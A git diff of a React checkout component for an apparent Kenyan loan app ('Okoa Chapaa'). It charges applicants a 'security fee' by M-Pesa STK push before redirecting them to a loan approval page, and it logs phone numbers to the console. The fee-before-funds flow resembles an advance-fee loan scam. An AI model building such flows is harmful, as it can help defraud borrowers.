@@ -1,37 +1,60 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { useNavigate } from 'react-router-dom'; // ← Added for navigation
+import { useNavigate } from 'react-router-dom';
 import toast, { Toaster } from 'react-hot-toast';
 
 const SecureLoans = ({ onBack }) => {
-  const navigate = useNavigate(); // ← Hook for programmatic navigation
-
+  const navigate = useNavigate();
+  
+  const [isLoading, setIsLoading] = useState(true);
   const [userData, setUserData] = useState({});
   const [phoneNumber, setPhoneNumber] = useState('');
   const [loanTrackingId, setLoanTrackingId] = useState('');
+  
   const [isPaying, setIsPaying] = useState(false);
   const [paymentStatus, setPaymentStatus] = useState(''); // 'success', 'failed', 'cancelled'
   const [clientReference, setClientReference] = useState('');
   const [payheroReference, setPayheroReference] = useState('');
   const [currentPollingStatus, setCurrentPollingStatus] = useState('');
-
+  
   const intervalRef = useRef(null);
 
-  // Load user data and generate tracking ID
+  // Load user data from localStorage on mount
   useEffect(() => {
-    const stored = JSON.parse(localStorage.getItem('okoaChapaaUser') || '{}');
-    if (!stored.loanTrackingId) {
-      const newId = 'OKC-' + Math.random().toString(36).substr(2, 9).toUpperCase();
-      stored.loanTrackingId = newId;
-      localStorage.setItem('okoaChapaaUser', JSON.stringify(stored));
-      setLoanTrackingId(newId);
-    } else {
-      setLoanTrackingId(stored.loanTrackingId);
+    try {
+      const storedString = localStorage.getItem('okoaChapaaUser');
+      let stored = {};
+
+      if (storedString) {
+        stored = JSON.parse(storedString);
+      }
+
+      console.log('🔄 Loaded from localStorage:', stored);
+
+      // Generate tracking ID if missing
+      if (!stored.loanTrackingId) {
+        const newId = 'OKC-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+        stored.loanTrackingId = newId;
+        localStorage.setItem('okoaChapaaUser', JSON.stringify(stored));
+        console.log('✅ Generated new Loan Tracking ID:', newId);
+      }
+
+      setUserData(stored);
+      setLoanTrackingId(stored.loanTrackingId || '');
+      setPhoneNumber(stored.mpesaPhone || '');
+
+      // Check if we have essential data
+      if (!stored.firstName && !stored.fullName) {
+        console.warn('⚠️ No user data (firstName/fullName) found in localStorage');
+      }
+    } catch (error) {
+      console.error('❌ Error loading from localStorage:', error);
+      toast.error('Failed to load your data. Please try again.');
+    } finally {
+      setIsLoading(false);
     }
-    setUserData(stored);
-    setPhoneNumber(stored.mpesaPhone || '');
   }, []);
 
-  // Continuous polling using PayHero's reference
+  // Continuous polling for payment status
   useEffect(() => {
     if (!payheroReference) return;
 
@@ -47,33 +70,29 @@ const SecureLoans = ({ onBack }) => {
           setCurrentPollingStatus(rawStatus);
 
           console.log(
-            `[${new Date().toISOString()}] Polling → ${rawStatus} ` +
-            `| PayHero Ref: ${payheroReference} ` +
-            `| Client Ref: ${clientReference} ` +
-            `| Phone: 0${phoneNumber} ` +
-            `| Amount: KES ${(userData.securityFee || userData.fee || 0).toLocaleString()} ` +
-            `| Tracking: ${loanTrackingId}`
+            `[${new Date().toISOString()}] Polling → ${rawStatus} | ` +
+            `PayHero Ref: ${payheroReference} | Client Ref: ${clientReference} | ` +
+            `Phone: 0${phoneNumber} | Amount: KES ${(userData.securityFee || userData.fee || 0).toLocaleString()}`
           );
 
           if (rawStatus === 'SUCCESS') {
             setPaymentStatus('success');
             clearInterval(intervalRef.current);
 
-            // Save approval timestamp for countdown on Approved page
             const updatedUserData = {
               ...userData,
               approvalTime: Date.now(),
               paymentStatus: 'success',
             };
-            localStorage.setItem('okoaChapaaUser', JSON.stringify(updatedUserData));
 
-            // Show success toast
-            toast.success('Payment Successful! Redirecting to your approval...', {
+            localStorage.setItem('okoaChapaaUser', JSON.stringify(updatedUserData));
+            setUserData(updatedUserData);
+
+            toast.success('Payment Successful! Redirecting to approval...', {
               duration: 5000,
               icon: '🎉',
             });
 
-            // Automatically navigate to Approved page after short delay
             setTimeout(() => {
               navigate('/approved');
             }, 3000);
@@ -83,29 +102,30 @@ const SecureLoans = ({ onBack }) => {
             clearInterval(intervalRef.current);
           } else if (rawStatus === 'CANCELLED') {
             setPaymentStatus('cancelled');
-            toast('Payment was cancelled. You can try again.', { icon: 'Warning', duration: 8000 });
+            toast('Payment was cancelled. You can try again.', { 
+              icon: '⚠️', 
+              duration: 8000 
+            });
             clearInterval(intervalRef.current);
           }
-        } else {
-          console.warn('Unexpected polling response:', data);
         }
       } catch (err) {
-        console.error('Polling error (likely 404 or HTML page):', err);
+        console.error('Polling error:', err);
       }
     }, 2000);
 
     return () => {
       if (intervalRef.current) clearInterval(intervalRef.current);
     };
-  }, [payheroReference, phoneNumber, userData, loanTrackingId, clientReference, navigate]);
+  }, [payheroReference, clientReference, phoneNumber, userData, navigate]);
 
   const handlePaySecurityFee = async () => {
-    if (phoneNumber.length !== 9 || isPaying) return;
+    if (phoneNumber.length !== 9 || isPaying || paymentStatus) return;
 
     setIsPaying(true);
     setCurrentPollingStatus('INITIATING');
 
-    const clientRef = `OKC-${Date.now()}-${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
+    const clientRef = `app-${Date.now()}-${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
     setClientReference(clientRef);
 
     try {
@@ -123,24 +143,18 @@ const SecureLoans = ({ onBack }) => {
 
       if (data.success && data.payheroReference) {
         setPayheroReference(data.payheroReference);
-
-        toast.success('STK Push sent! Please check your phone and complete payment.', {
-          icon: 'Money',
+        toast.success('STK Push sent! Check your phone to complete payment.', {
+          icon: '📱',
           duration: 10000,
         });
-
-        console.log(
-          `[${new Date().toISOString()}] STK Push success | ` +
-          `Client Ref: ${clientRef} | PayHero Ref: ${data.payheroReference}`
-        );
       } else {
-        throw new Error(data.error || 'No PayHero reference returned');
+        throw new Error(data.error || 'Failed to get PayHero reference');
       }
     } catch (err) {
       toast.error('Failed to initiate payment. Please try again.');
       console.error('STK Push failed:', err);
 
-      // Reset states
+      // Reset states on failure
       setIsPaying(false);
       setClientReference('');
       setPayheroReference('');
@@ -148,8 +162,34 @@ const SecureLoans = ({ onBack }) => {
     }
   };
 
-  if (!userData.firstName) {
-    return <div className="text-center pt-28 text-lg">Loading your loan details...</div>;
+  // Show loading screen
+  if (isLoading) {
+    return (
+      <div className="text-center pt-28 text-lg">
+        Loading your loan details...
+      </div>
+    );
+  }
+
+  // Show error/fallback if critical data is missing
+  if (!userData.firstName && !userData.fullName) {
+    return (
+      <div className="text-center pt-28 px-6">
+        <div className="max-w-md mx-auto bg-white rounded-3xl shadow-xl p-8">
+          <i className="fas fa-exclamation-triangle text-6xl text-orange-500 mb-6"></i>
+          <h2 className="text-2xl font-bold text-gray-800 mb-3">No Loan Details Found</h2>
+          <p className="text-gray-600 mb-8">
+            We couldn't find your loan application data. Please go back and complete the form again.
+          </p>
+          <button
+            onClick={onBack}
+            className="w-full py-4 bg-primary text-white font-semibold rounded-2xl hover:bg-primary/90 transition"
+          >
+            ← Go Back to Application
+          </button>
+        </div>
+      </div>
+    );
   }
 
   const securityFee = userData.securityFee || userData.fee || 0;
@@ -157,6 +197,7 @@ const SecureLoans = ({ onBack }) => {
   const getDisplayStatus = () => {
     if (!payheroReference) return 'READY TO PAY';
     if (!currentPollingStatus) return 'WAITING FOR PAYMENT...';
+
     switch (currentPollingStatus) {
       case 'INITIATING': return 'SENDING REQUEST...';
       case 'QUEUED': return 'QUEUED – WAITING FOR M-PESA';
@@ -183,7 +224,7 @@ const SecureLoans = ({ onBack }) => {
             padding: '16px 20px',
             maxWidth: '90vw',
           },
-          success: { icon: 'Party', style: { background: '#10B981' } },
+          success: { style: { background: '#10B981' } },
           error: { style: { background: '#EF4444' } },
         }}
       />
@@ -204,16 +245,16 @@ const SecureLoans = ({ onBack }) => {
                 Secure Your Loan
               </h2>
               <p className="text-base sm:text-lg text-gray-700">
-                Hello <strong>{userData.firstName}</strong>,<br />
+                Hello <strong>{userData.firstName || userData.fullName}</strong>,<br />
                 complete the final step to receive your funds instantly.
               </p>
             </div>
 
-            {/* User Info List */}
+            {/* User Info */}
             <div className="space-y-4 mb-10">
               <div className="bg-gray-50 rounded-2xl p-4">
                 <p className="text-sm text-gray-600">Full Name</p>
-                <p className="font-semibold text-lg">{userData.fullName || '-'}</p>
+                <p className="font-semibold text-lg">{userData.fullName || userData.firstName || '-'}</p>
               </div>
               <div className="bg-gray-50 rounded-2xl p-4">
                 <p className="text-sm text-gray-600">National ID</p>
@@ -288,7 +329,7 @@ const SecureLoans = ({ onBack }) => {
                 </div>
               </div>
 
-              {/* Live Polling Status */}
+              {/* Live Status */}
               {isPollingActive && (
                 <div className="mb-6 p-5 bg-blue-50 border border-blue-200 rounded-2xl animate-pulse">
                   <p className="text-blue-900 flex items-center justify-center gap-3 text-lg font-medium">
@@ -307,7 +348,6 @@ const SecureLoans = ({ onBack }) => {
                   </p>
                 </div>
               )}
-
               {paymentStatus === 'failed' && (
                 <div className="mb-6 p-5 bg-red-50 border border-red-300 rounded-2xl">
                   <p className="text-red-800 font-bold text-center text-lg">
@@ -316,7 +356,6 @@ const SecureLoans = ({ onBack }) => {
                   </p>
                 </div>
               )}
-
               {paymentStatus === 'cancelled' && (
                 <div className="mb-6 p-5 bg-orange-50 border border-orange-300 rounded-2xl">
                   <p className="text-orange-800 font-bold text-center text-lg">
@@ -329,15 +368,17 @@ const SecureLoans = ({ onBack }) => {
               <button
                 onClick={handlePaySecurityFee}
                 disabled={phoneNumber.length !== 9 || isPaying || !!paymentStatus}
-                className="w-full btn-primary text-lg py-5 rounded-2xl font-bold shadow-lg hover:shadow-xl disabled:opacity-60 disabled:cursor-not-allowed relative transition"
+                className="w-full btn-primary text-lg py-5 rounded-2xl font-bold shadow-lg hover:shadow-xl disabled:opacity-60 disabled:cursor-not-allowed transition"
               >
                 {isPaying ? (
                   <>
                     <i className="fas fa-spinner fa-spin mr-3"></i>
                     Sending STK Push...
                   </>
+                ) : paymentStatus === 'success' ? (
+                  'Processing Approval...'
                 ) : paymentStatus ? (
-                  paymentStatus === 'success' ? 'Processing Approval...' : 'Try Payment Again'
+                  'Try Payment Again'
                 ) : (
                   `Pay KES ${securityFee.toLocaleString()} Security Fee`
                 )}
